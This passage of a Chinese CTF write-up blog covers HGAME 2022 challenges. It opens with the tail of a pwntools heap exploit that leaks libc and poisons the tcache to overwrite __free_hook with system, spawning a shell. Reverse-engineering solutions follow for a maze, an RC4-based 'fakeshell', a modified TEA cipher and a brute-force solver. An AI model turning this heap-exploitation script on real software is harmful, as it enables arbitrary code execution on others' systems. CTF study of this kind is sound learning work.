    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;index?&#34;</span>, str(idx))
    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;size?&#34;</span>, str(size))
    p<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;content?&#34;</span>, content)

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">show</span>(idx):
    menu(<span style="color:#ae81ff">2</span>)
    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;index?&#34;</span>, str(idx))

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">free</span>(idx):
    menu(<span style="color:#ae81ff">3</span>)
    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;index?&#34;</span>, str(idx))


<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>):
    add(i, <span style="color:#ae81ff">0x80</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;aaa&#34;</span>)

<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">7</span>):
    free(<span style="color:#ae81ff">7</span><span style="color:#f92672">-</span>i)

free(<span style="color:#ae81ff">0</span>)
show(<span style="color:#ae81ff">0</span>)

libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x7f</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">6</span>:]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>)) <span style="color:#f92672">-</span> <span style="color:#ae81ff">96</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x10</span> <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;__malloc_hook&#34;</span>]
print(hex(libc<span style="color:#f92672">.</span>address))

<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>):
    add(i, <span style="color:#ae81ff">0x80</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;bbb&#34;</span>)

<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">9</span>):
    add(i, <span style="color:#ae81ff">0x20</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;ccc&#34;</span>)

<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>):
    free(<span style="color:#ae81ff">8</span><span style="color:#f92672">-</span>i)

free(<span style="color:#ae81ff">0</span>)
free(<span style="color:#ae81ff">1</span>)

<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">9</span>):
    add(i, <span style="color:#ae81ff">0x20</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;ddd&#34;</span>)

add(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0x20</span>, p64(libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;__free_hook&#34;</span>]))
add(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>)
add(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;eee&#34;</span>)
add(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0x20</span>, p64(libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;system&#34;</span>]))
free(<span style="color:#ae81ff">0</span>)


p<span style="color:#f92672">.</span>interactive()
</code></pre></div><h3 id="rexd-maze">[RE]xD MAZE</h3>
<blockquote>
<p>By s0uthwood</p>
</blockquote>
<p>一维的迷宫，直接用 vscode 的小技巧转成 flag</p>
<p>选中 512 个 <code>#</code> 和后面的一个空格，然后 <code>CTRL+SHIFT+L</code> 全选，换成 <code>3</code>，以此类推</p>
<h3 id="refakeshell">[RE]fakeshell</h3>
<blockquote>
<p>By oneQuiz</p>
</blockquote>
<p>理解了题意后我们直奔验证 <code>sudo</code> 密码的函数，发现是以 <code>aHappyhg4me</code> 指向的字符串为秘钥的 <code>RC4</code> 加密算法，</p>
<p><figure 
	
		class="gallery-image" 
		style="
			flex-grow: 148; 
			flex-basis: 357px"
	>
	<a href="/post/hgame2022-writeup-by-or4nge/img/fakeshell_image-20220207085127425.png" data-size="694x466">
		<img src="/post/hgame2022-writeup-by-or4nge/img/fakeshell_image-20220207085127425.png"
			width="694"
			height="466"
			srcset="/post/hgame2022-writeup-by-or4nge/img/fakeshell_image-20220207085127425_hu42c6455fdb78ef1edddc3104b5e8c316_41800_480x0_resize_box_3.png 480w, /post/hgame2022-writeup-by-or4nge/img/fakeshell_image-20220207085127425_hu42c6455fdb78ef1edddc3104b5e8c316_41800_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure></p>
<p><figure 
	
		class="gallery-image" 
		style="
			flex-grow: 219; 
			flex-basis: 526px"
	>
	<a href="/post/hgame2022-writeup-by-or4nge/img/fakeshell_image-20220207085152260.png" data-size="731x333">
		<img src="/post/hgame2022-writeup-by-or4nge/img/fakeshell_image-20220207085152260.png"
			width="731"
			height="333"
			srcset="/post/hgame2022-writeup-by-or4nge/img/fakeshell_image-20220207085152260_huaea897d637f99572a9f0b0f8b4ab602e_32154_480x0_resize_box_3.png 480w, /post/hgame2022-writeup-by-or4nge/img/fakeshell_image-20220207085152260_huaea897d637f99572a9f0b0f8b4ab602e_32154_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure></p>
<p>但是直接用 <code>aHappyhg4me</code> 指向的字符串解密只有乱码。</p>
<p><figure 
	
		class="gallery-image" 
		style="
			flex-grow: 1322; 
			flex-basis: 3172px"
	>
	<a href="/post/hgame2022-writeup-by-or4nge/img/fakeshell_image-20220207085339570.png" data-size="661x50">
		<img src="/post/hgame2022-writeup-by-or4nge/img/fakeshell_image-20220207085339570.png"
			width="661"
			height="50"
			srcset="/post/hgame2022-writeup-by-or4nge/img/fakeshell_image-20220207085339570_hud03c2553b601f02ecfff9970d1cb59f4_7312_480x0_resize_box_3.png 480w, /post/hgame2022-writeup-by-or4nge/img/fakeshell_image-20220207085339570_hud03c2553b601f02ecfff9970d1cb59f4_7312_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure></p>
<p><figure 
	
		class="gallery-image" 
		style="
			flex-grow: 285; 
			flex-basis: 685px"
	>
	<a href="/post/hgame2022-writeup-by-or4nge/img/fakeshell_image-20220207085413778.png" data-size="1528x535">
		<img src="/post/hgame2022-writeup-by-or4nge/img/fakeshell_image-20220207085413778.png"
			width="1528"
			height="535"
			srcset="/post/hgame2022-writeup-by-or4nge/img/fakeshell_image-20220207085413778_hu2dad1803ca5e2912b7a278610ab435cc_47765_480x0_resize_box_3.png 480w, /post/hgame2022-writeup-by-or4nge/img/fakeshell_image-20220207085413778_hu2dad1803ca5e2912b7a278610ab435cc_47765_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure></p>
<p>之后我就卡住了，看了 WP 才知道原来在 c 语言中，被 <code>__attribute__((constructor))</code> 分配属性的函数会先于 <code>main()</code> 函数被调用，IDA 将其反编译到 <code>init</code> 中。不过我直接看也看 <code>init</code> 我也看不出来什么不对劲，只是能看出它好像是调用了其他函数的指针。</p>
<p><figure 
	
		class="gallery-image" 
		style="
			flex-grow: 303; 
			flex-basis: 727px"
	>
	<a href="/post/hgame2022-writeup-by-or4nge/img/fakeshell_image-20220207090438527.png" data-size="955x315">
		<img src="/post/hgame2022-writeup-by-or4nge/img/fakeshell_image-20220207090438527.png"
			width="955"
			height="315"
			srcset="/post/hgame2022-writeup-by-or4nge/img/fakeshell_image-20220207090438527_hu522f7b6a3d246fb4f41a95d60ed1cc29_29168_480x0_resize_box_3.png 480w, /post/hgame2022-writeup-by-or4nge/img/fakeshell_image-20220207090438527_hu522f7b6a3d246fb4f41a95d60ed1cc29_29168_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure></p>
<p>不过我们只要在 <code>aHappyhg4me</code> 处按下 <code>X</code> 查看其被交叉引用的记录，就可以较容易地发现明显这个字符串是被修改过的。</p>
<p><figure 
	
		class="gallery-image" 
		style="
			flex-grow: 381; 
			flex-basis: 916px"
	>
	<a href="/post/hgame2022-writeup-by-or4nge/img/fakeshell_image-20220207091047316.png" data-size="1016x266">
		<img src="/post/hgame2022-writeup-by-or4nge/img/fakeshell_image-20220207091047316.png"
			width="1016"
			height="266"
			srcset="/post/hgame2022-writeup-by-or4nge/img/fakeshell_image-20220207091047316_hube9a80b19feaecae3f8c055188637a26_21925_480x0_resize_box_3.png 480w, /post/hgame2022-writeup-by-or4nge/img/fakeshell_image-20220207091047316_hube9a80b19feaecae3f8c055188637a26_21925_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure></p>
<p>双击 <code>mov</code> 指令，成功找到修改秘钥字符串的函数。</p>
<p><figure 
	
		class="gallery-image" 
		style="
			flex-grow: 162; 
			flex-basis: 390px"
	>
	<a href="/post/hgame2022-writeup-by-or4nge/img/fakeshell_image-20220207091507014.png" data-size="729x448">
		<img src="/post/hgame2022-writeup-by-or4nge/img/fakeshell_image-20220207091507014.png"
			width="729"
			height="448"
			srcset="/post/hgame2022-writeup-by-or4nge/img/fakeshell_image-20220207091507014_hu540f55b904194844930832ae5a1f95e7_39983_480x0_resize_box_3.png 480w, /post/hgame2022-writeup-by-or4nge/img/fakeshell_image-20220207091507014_hu540f55b904194844930832ae5a1f95e7_39983_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure></p>
<p>解密得到flag。</p>
<p><figure 
	
		class="gallery-image" 
		style="
			flex-grow: 199; 
			flex-basis: 478px"
	>
	<a href="/post/hgame2022-writeup-by-or4nge/img/fakeshell_image-20220207091812702.png" data-size="972x488">
		<img src="/post/hgame2022-writeup-by-or4nge/img/fakeshell_image-20220207091812702.png"
			width="972"
			height="488"
			srcset="/post/hgame2022-writeup-by-or4nge/img/fakeshell_image-20220207091812702_hu08357b1bfc21c61cdd6b9be0f9af2ff0_47259_480x0_resize_box_3.png 480w, /post/hgame2022-writeup-by-or4nge/img/fakeshell_image-20220207091812702_hu08357b1bfc21c61cdd6b9be0f9af2ff0_47259_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure></p>
<p>关于 <code>__attribute__</code>：</p>
<p><code>__attribute__</code>可用于为函数或者数据声明赋属性值。给函数分配属性的主要目的是为了让编译程序可以优化处理。分配给函数的属性位于函数原型的声明中。</p>
<ul>
<li><code>__attribute__((constructor))</code> 先于<code>main()</code>函数调用；</li>
<li><code>__attribute__((destructor))</code>在<code>main()</code>函数后调用。</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">before</span>(<span style="color:#66d9ef">void</span>) __attribute__((constructor));
<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">after</span>(<span style="color:#66d9ef">void</span>) __attribute__((destructor));

<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">before</span>() {
    printf(<span style="color:#e6db74">&#34;before main</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
}

<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">after</span>(<span style="color:#66d9ef">void</span>) {
    printf(<span style="color:#e6db74">&#34;after main</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
}

<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
    printf(<span style="color:#e6db74">&#34;main</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}
</code></pre></div><p><figure 
	
		class="gallery-image" 
		style="
			flex-grow: 568; 
			flex-basis: 1364px"
	>
	<a href="/post/hgame2022-writeup-by-or4nge/img/fakeshell_image-20220207093954147.png" data-size="830x146">
		<img src="/post/hgame2022-writeup-by-or4nge/img/fakeshell_image-20220207093954147.png"
			width="830"
			height="146"
			srcset="/post/hgame2022-writeup-by-or4nge/img/fakeshell_image-20220207093954147_hufd5fc201c2a4c40faeee999712106998_23328_480x0_resize_box_3.png 480w, /post/hgame2022-writeup-by-or4nge/img/fakeshell_image-20220207093954147_hufd5fc201c2a4c40faeee999712106998_23328_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure></p>
<p>还可以通过参数设置优先级关系：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">before</span>(<span style="color:#66d9ef">void</span>) __attribute__((constructor));

<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">before3</span>(<span style="color:#66d9ef">void</span>) __attribute__((constructor(<span style="color:#ae81ff">103</span>)));
<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">before2</span>(<span style="color:#66d9ef">void</span>) __attribute__((constructor(<span style="color:#ae81ff">102</span>)));
<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">before1</span>(<span style="color:#66d9ef">void</span>) __attribute__((constructor(<span style="color:#ae81ff">101</span>)));

<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">before2</span>() {
    printf(<span style="color:#e6db74">&#34;before  102</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
}

<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">before1</span>() {
    printf(<span style="color:#e6db74">&#34;before  101</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
}

<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">before3</span>() {
    printf(<span style="color:#e6db74">&#34;before  103</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
}

<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">before</span>() {
    printf(<span style="color:#e6db74">&#34;before main</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
}


<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
    printf(<span style="color:#e6db74">&#34;main</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}
</code></pre></div><p><figure 
	
		class="gallery-image" 
		style="
			flex-grow: 492; 
			flex-basis: 1182px"
	>
	<a href="/post/hgame2022-writeup-by-or4nge/img/fakeshell_image-20220207093947895.png" data-size="823x167">
		<img src="/post/hgame2022-writeup-by-or4nge/img/fakeshell_image-20220207093947895.png"
			width="823"
			height="167"
			srcset="/post/hgame2022-writeup-by-or4nge/img/fakeshell_image-20220207093947895_huabc9c763f3ab4b66813626fd1306f983_24986_480x0_resize_box_3.png 480w, /post/hgame2022-writeup-by-or4nge/img/fakeshell_image-20220207093947895_huabc9c763f3ab4b66813626fd1306f983_24986_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure></p>
<h3 id="recreakme2">[RE]creakme2</h3>
<blockquote>
<p>By s0uthwood</p>
</blockquote>
<p>在加密函数里看一下汇编，发现用了 try except 来构造了一个除 0 异常，当最高位为 0 时，异或一个 0x1234567</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdint.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">encipher</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> num_rounds, <span style="color:#66d9ef">uint32_t</span> v[<span style="color:#ae81ff">2</span>], <span style="color:#66d9ef">uint32_t</span> <span style="color:#66d9ef">const</span> key[<span style="color:#ae81ff">4</span>]) {
    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> i;
    <span style="color:#66d9ef">uint32_t</span> v0<span style="color:#f92672">=</span>v[<span style="color:#ae81ff">0</span>], v1<span style="color:#f92672">=</span>v[<span style="color:#ae81ff">1</span>], sum<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>, delta<span style="color:#f92672">=</span><span style="color:#ae81ff">0x9E3779B1</span>;
    <span style="color:#66d9ef">for</span> (i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> num_rounds; i<span style="color:#f92672">++</span>) {
        v0 <span style="color:#f92672">+=</span> (((v1 <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">^</span> (v1 <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">5</span>)) <span style="color:#f92672">+</span> v1) <span style="color:#f92672">^</span> (sum <span style="color:#f92672">+</span> key[sum <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">3</span>]);
        sum <span style="color:#f92672">+=</span> delta;
        <span style="color:#66d9ef">if</span> (sum <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">31</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
            sum <span style="color:#f92672">^=</span> <span style="color:#ae81ff">0x1234567</span>;
        printf(<span style="color:#e6db74">&#34;%x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, sum);
        v1 <span style="color:#f92672">+=</span> (((v0 <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">^</span> (v0 <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">5</span>)) <span style="color:#f92672">+</span> v0) <span style="color:#f92672">^</span> (sum <span style="color:#f92672">+</span> key[(sum<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">11</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">3</span>]);
    }
    v[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">=</span>v0; v[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">=</span>v1;
    printf(<span style="color:#e6db74">&#34;%x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, sum);
}

<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">decipher</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> num_rounds, <span style="color:#66d9ef">uint32_t</span> v[<span style="color:#ae81ff">2</span>], <span style="color:#66d9ef">uint32_t</span> <span style="color:#66d9ef">const</span> key[<span style="color:#ae81ff">4</span>]) {
    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> i;
    <span style="color:#66d9ef">uint32_t</span> v0<span style="color:#f92672">=</span>v[<span style="color:#ae81ff">0</span>], v1<span style="color:#f92672">=</span>v[<span style="color:#ae81ff">1</span>], delta<span style="color:#f92672">=</span><span style="color:#ae81ff">0x9E3779B1</span>, sum<span style="color:#f92672">=</span><span style="color:#ae81ff">0xc78e4d05</span>;
    <span style="color:#66d9ef">for</span> (i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> num_rounds; i<span style="color:#f92672">++</span>) {
        v1 <span style="color:#f92672">-=</span> (((v0 <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">^</span> (v0 <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">5</span>)) <span style="color:#f92672">+</span> v0) <span style="color:#f92672">^</span> (sum <span style="color:#f92672">+</span> key[(sum<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">11</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">3</span>]);
        <span style="color:#66d9ef">if</span> (sum <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">31</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
            sum <span style="color:#f92672">^=</span> <span style="color:#ae81ff">0x1234567</span>;
        sum <span style="color:#f92672">-=</span> delta;
        printf(<span style="color:#e6db74">&#34;%x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, sum);
        v0 <span style="color:#f92672">-=</span> (((v1 <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">^</span> (v1 <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">5</span>)) <span style="color:#f92672">+</span> v1) <span style="color:#f92672">^</span> (sum <span style="color:#f92672">+</span> key[sum <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">3</span>]);
    }
    v[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">=</span>v0; v[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">=</span>v1;
}

<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
{
    <span style="color:#66d9ef">uint32_t</span> v[]<span style="color:#f92672">=</span>{<span style="color:#ae81ff">0x457E62CF</span>, <span style="color:#ae81ff">0x9537896C</span>, <span style="color:#ae81ff">0x1F7E7F72</span>, <span style="color:#ae81ff">0xF7A073D8</span>, <span style="color:#ae81ff">0x8E996868</span>, <span style="color:#ae81ff">0x40AFAF99</span>, <span style="color:#ae81ff">0xF990E34</span>, <span style="color:#ae81ff">0x196F4086</span>};
    <span style="color:#66d9ef">uint32_t</span> <span style="color:#66d9ef">const</span> k[<span style="color:#ae81ff">4</span>]<span style="color:#f92672">=</span>{<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">4</span>};
    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> r<span style="color:#f92672">=</span><span style="color:#ae81ff">32</span>;
    decipher(r, v, k);
    decipher(r, v <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>, k);
    decipher(r, v <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>, k);
    decipher(r, v <span style="color:#f92672">+</span> <span style="color:#ae81ff">6</span>, k);
    printf(<span style="color:#e6db74">&#34;%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,v);
    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}
</code></pre></div><h3 id="reupx-magic-0">[RE]upx magic 0</h3>
<blockquote>
<p>By oneQuiz</p>
</blockquote>
<p>听说是放错附件了所以这个并没有 UPX 壳。。。</p>
<p>IDA 打开搜索字符串进入验证函数：</p>
<p><figure 
	
		class="gallery-image" 
		style="
			flex-grow: 197; 
			flex-basis: 472px"
	>
	<a href="/post/hgame2022-writeup-by-or4nge/img/upx0_image-20220207094935570.png" data-size="1062x539">
		<img src="/post/hgame2022-writeup-by-or4nge/img/upx0_image-20220207094935570.png"
			width="1062"
			height="539"
			srcset="/post/hgame2022-writeup-by-or4nge/img/upx0_image-20220207094935570_huf62ebc71fd80e17e86be16e18e4c695e_54979_480x0_resize_box_3.png 480w, /post/hgame2022-writeup-by-or4nge/img/upx0_image-20220207094935570_huf62ebc71fd80e17e86be16e18e4c695e_54979_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure></p>
<p>顺了一遍发现这个加密是单向的，然后卡住（我太笨了T-T）</p>
<p>经过提醒发现可以直接用 ascii 码可见位直接爆破。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">short</span> ans[<span style="color:#ae81ff">33</span>];
<span style="color:#66d9ef">char</span> flag[<span style="color:#ae81ff">33</span>];
<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
    ans[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">36200</span>;
    ans[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">40265</span>;
    ans[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">10770</span>;
    ans[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">43802</span>;
    ans[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">52188</span>;
    ans[<span style="color:#ae81ff">5</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">47403</span>;
    ans[<span style="color:#ae81ff">6</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">11826</span>;
    ans[<span style="color:#ae81ff">7</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">40793</span>;
    ans[<span style="color:#ae81ff">8</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">56781</span>;
    ans[<span style="color:#ae81ff">9</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">40265</span>;
    ans[<span style="color:#ae81ff">10</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">43274</span>;
    ans[<span style="color:#ae81ff">11</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">3696</span>;
    ans[<span style="color:#ae81ff">12</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">62927</span>;
    ans[<span style="color:#ae81ff">13</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">2640</span>;
    ans[<span style="color:#ae81ff">14</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">23285</span>;
    ans[<span style="color:#ae81ff">15</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">65439</span>;
    ans[<span style="color:#ae81ff">16</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">40793</span>;
    ans[<span style="color:#ae81ff">17</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">48395</span>;
    ans[<span style="color:#ae81ff">18</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">22757</span>;
    ans[<span style="color:#ae81ff">19</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">14371</span>;
    ans[<span style="color:#ae81ff">20</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">48923</span>;
    ans[<span style="color:#ae81ff">21</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">30887</span>;
    ans[<span style="color:#ae81ff">22</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">43802</span>;
    ans[<span style="color:#ae81ff">23</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">18628</span>;
    ans[<span style="color:#ae81ff">24</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">43274</span>;
    ans[<span style="color:#ae81ff">25</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">11298</span>;
    ans[<span style="color:#ae81ff">26</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">40793</span>;
    ans[<span style="color:#ae81ff">27</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">23749</span>;
    ans[<span style="color:#ae81ff">28</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">24277</span>;
    ans[<span style="color:#ae81ff">29</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">30887</span>;
    ans[<span style="color:#ae81ff">30</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">9842</span>;
    ans[<span style="color:#ae81ff">31</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">22165</span>;
    <span style="color:#66d9ef">int</span> rot <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">short</span> rot1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
    <span style="color:#66d9ef">char</span> c <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
